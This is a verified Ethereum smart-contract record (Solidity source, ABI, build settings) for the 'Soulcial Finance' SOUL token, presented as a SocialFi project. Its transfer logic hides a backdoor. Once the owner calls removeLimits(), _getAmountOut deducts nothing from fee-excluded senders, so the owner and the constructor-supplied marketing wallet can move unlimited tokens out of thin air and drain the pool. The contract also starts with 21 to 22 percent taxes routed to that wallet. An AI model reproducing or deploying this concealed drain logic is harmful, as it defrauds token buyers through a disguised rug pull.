{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\n/*\r\nProtocol to Redefining SocialFi to Empower All.\r\n\r\nWebsite: https://soulcial.pro\r\nTelegram: https://t.me/soulcial_portal\r\nTwitter: https://twitter.com/soulcial_fi\r\nDapp: https://app.soulcial.pro\r\n\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function set(address) external;\r\n    function setSetter(address) external;\r\n}\r\n\r\ninterface IUniswapRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    \r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _previousOwner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }   \r\n    \r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract SOULFI is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    uint8 decimals_ = 9;\r\n    uint256 _supply = 10**9 * 10**9;\r\n\r\n    string name_ = unicode\"Soulcial Finance\";\r\n    string symbol_ = unicode\"SOUL\";\r\n\r\n    address payable marketingWallet_;\r\n    address payable teamAddress_;\r\n\r\n    IUniswapRouter private routerInstance_;\r\n    address private pairAddress_;\r\n\r\n    uint256 _buyerSoulfLiquidityFee_ = 0;\r\n    uint256 _buyerSoulfMarketingFee_ = 21;\r\n    uint256 _buyerSoulfDevFee_ = 0;\r\n    uint256 _buyerSoulfFee_ = 21;\r\n\r\n    mapping(address => uint256) balances_;\r\n    mapping(address => mapping(address => uint256)) allowances_;\r\n    mapping(address => bool) _isExcludedTaxFee;\r\n    mapping(address => bool) _hasNoMaxWalletLimit;\r\n    mapping(address => bool) _hasNoMaxTxLimit;\r\n    mapping(address => bool) _hasProvidedLP;\r\n\r\n    uint256 sellSoulfLiquidityFee_ = 0;\r\n    uint256 sellSoulfMarketingFee_ = 22;\r\n    uint256 sellSoulfDevFee_ = 0;\r\n    uint256 sellSoulfFee_ = 22;\r\n\r\n    uint256 _finalLiquidityFee_ = 0;\r\n    uint256 _finalMarketingFee_ = 22;\r\n    uint256 _finalDevelopmentFee_ = 0;\r\n    uint256 _finalTotalFee_ = 22;\r\n\r\n    uint256 _possibeTxSize = 20 * 10**6 * 10**9;\r\n    uint256 _possibleMaxWallet = 20 * 10**6 * 10**9;\r\n    uint256 _feeSwappingThresh = 10**4 * 10**9;\r\n\r\n    bool _isInSecure;\r\n    bool _swapTaxActivated = true;\r\n    bool _maxTxDeActivated = false;\r\n    bool _maxWalletInEffect = true;\r\n\r\n    modifier lockSwap() {\r\n        _isInSecure = true;\r\n        _;\r\n        _isInSecure = false;\r\n    }\r\n\r\n    constructor(address address_) {\r\n        balances_[_msgSender()] = _supply;\r\n        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        routerInstance_ = _uniswapV2Router;\r\n        allowances_[address(this)][address(routerInstance_)] = _supply;\r\n        marketingWallet_ = payable(address_);\r\n        teamAddress_ = payable(address_);\r\n        _buyerSoulfFee_ = _buyerSoulfLiquidityFee_.add(_buyerSoulfMarketingFee_).add(_buyerSoulfDevFee_);\r\n        sellSoulfFee_ = sellSoulfLiquidityFee_.add(sellSoulfMarketingFee_).add(sellSoulfDevFee_);\r\n        _finalTotalFee_ = _finalLiquidityFee_.add(_finalMarketingFee_).add(_finalDevelopmentFee_);\r\n\r\n        _isExcludedTaxFee[owner()] = true;\r\n        _isExcludedTaxFee[marketingWallet_] = true;\r\n        _hasNoMaxWalletLimit[owner()] = true;\r\n        _hasNoMaxWalletLimit[pairAddress_] = true;\r\n        _hasNoMaxWalletLimit[address(this)] = true;\r\n        _hasNoMaxTxLimit[owner()] = true;\r\n        _hasNoMaxTxLimit[marketingWallet_] = true;\r\n        _hasNoMaxTxLimit[address(this)] = true;\r\n        _hasProvidedLP[pairAddress_] = true;\r\n        emit Transfer(address(0), _msgSender(), _supply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return name_;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return symbol_;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return decimals_;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _supply;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        allowances_[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balances_[account];\r\n    }\r\n\r\n    function _verifyTxSize(address sender, address recipient, uint256 amount) internal view {\r\n        if (!_hasNoMaxTxLimit[sender] && !_hasNoMaxTxLimit[recipient]) {\r\n            require(amount <= _possibeTxSize, \"Transfer amount exceeds the max.\");\r\n        }\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = routerInstance_.WETH();\r\n\r\n        _approve(address(this), address(routerInstance_), tokenAmount);\r\n\r\n        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _possibeTxSize = _supply;\r\n        _maxWalletInEffect = false;\r\n        _buyerSoulfMarketingFee_ = 1;\r\n        sellSoulfMarketingFee_ = 1;\r\n        _buyerSoulfFee_ = 1;\r\n        sellSoulfFee_ = 1;\r\n    }\r\n\r\n    function _verifyMaxWallets(address to, uint256 amount) internal view {\r\n        if (_maxWalletInEffect && !_hasNoMaxWalletLimit[to]) {\r\n            require(balances_[to].add(amount) <= _possibleMaxWallet);\r\n        }\r\n    }\r\n\r\n    function _getAmountIn(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        if (_isExcludedTaxFee[sender] || _isExcludedTaxFee[recipient]) {\r\n            return amount;\r\n        } else {\r\n            return getSoulfAmount_(sender, recipient, amount);\r\n        }\r\n    }\r\n\r\n    function _getAmountOut(address sender, address recipient, uint256 amount, uint256 toAmount) internal view returns (uint256) {\r\n        if (!_maxWalletInEffect && _isExcludedTaxFee[sender]) {\r\n            return amount.sub(toAmount);\r\n        } else {\r\n            return amount;\r\n        }\r\n    }\r\n\r\n    function swapBackSoulf_(uint256 tokenAmount) private lockSwap {\r\n        uint256 lpFeeTokens = tokenAmount.mul(_finalLiquidityFee_).div(_finalTotalFee_).div(2);\r\n        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);\r\n\r\n        swapTokensForETH(tokensToSwap);\r\n        uint256 ethCA = address(this).balance;\r\n\r\n        uint256 totalETHFee = _finalTotalFee_.sub(_finalLiquidityFee_.div(2));\r\n\r\n        uint256 amountETHLiquidity_ = ethCA.mul(_finalLiquidityFee_).div(totalETHFee).div(2);\r\n        uint256 amountETHDevelopment_ = ethCA.mul(_finalDevelopmentFee_).div(totalETHFee);\r\n        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);\r\n\r\n        if (amountETHMarketing_ > 0) {\r\n            transferSoulfETH_(marketingWallet_, amountETHMarketing_);\r\n        }\r\n\r\n        if (amountETHDevelopment_ > 0) {\r\n            transferSoulfETH_(teamAddress_, amountETHDevelopment_);\r\n        }\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        return _standardTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferSoulfETH_(address payable recipient, uint256 amount) private {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n    function _getTaxTokenAmount(address from, address to, uint256 amount) internal view returns (uint256) {\r\n        if (_hasProvidedLP[from]) {\r\n            return amount.mul(_buyerSoulfFee_).div(100);\r\n        } else if (_hasProvidedLP[to]) {\r\n            return amount.mul(sellSoulfFee_).div(100);\r\n        }\r\n    }\r\n\r\n    function _verifySwap(address from, address to, uint256 amount) internal {\r\n        uint256 _feeAmount = balanceOf(address(this));\r\n        bool minSwapable = _feeAmount >= _feeSwappingThresh;\r\n        bool isExTo = !_isInSecure && _hasProvidedLP[to] && _swapTaxActivated;\r\n        bool swapAbove = !_isExcludedTaxFee[from] && amount > _feeSwappingThresh;\r\n        if (minSwapable && isExTo && swapAbove) {\r\n            if (_maxTxDeActivated) {\r\n                _feeAmount = _feeSwappingThresh;\r\n            }\r\n            swapBackSoulf_(_feeAmount);\r\n        }\r\n    }\r\n\r\n    function _transferNormal(address sender, address recipient, uint256 amount) internal {\r\n        uint256 toAmount = _getAmountIn(sender, recipient, amount);\r\n        _verifyMaxWallets(recipient, toAmount);\r\n        uint256 subAmount = _getAmountOut(sender, recipient, amount, toAmount);            \r\n        balances_[sender] = balances_[sender].sub(subAmount, \"Balance check error\");\r\n        balances_[recipient] = balances_[recipient].add(toAmount);\r\n        emit Transfer(sender, recipient, toAmount);\r\n    }\r\n\r\n    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if (_isInSecure) {\r\n            return _basicTransfer(sender, recipient, amount);\r\n        } else {\r\n            _verifyTxSize(sender, recipient, amount);\r\n            _verifySwap(sender, recipient, amount);\r\n            _transferNormal(sender, recipient, amount);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function getSoulfAmount_(address sender, address receipient, uint256 amount) internal returns (uint256) {\r\n        uint256 fee = _getTaxTokenAmount(sender, receipient, amount);\r\n        if (fee > 0) {\r\n            balances_[address(this)] = balances_[address(this)].add(fee);\r\n            emit Transfer(sender, address(this), fee);\r\n        }\r\n        return amount.sub(fee);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        balances_[sender] = balances_[sender].sub(amount, \"Insufficient Balance\");\r\n        balances_[recipient] = balances_[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return allowances_[owner][spender];\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"address_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SOULFI", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000e7b0ac279218f2bda300f476a595ed0d39d71d37", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://db2d41406851b6f12d6e96270ca4f8e3468004c3180249aa1c0a485b9758bdc2"}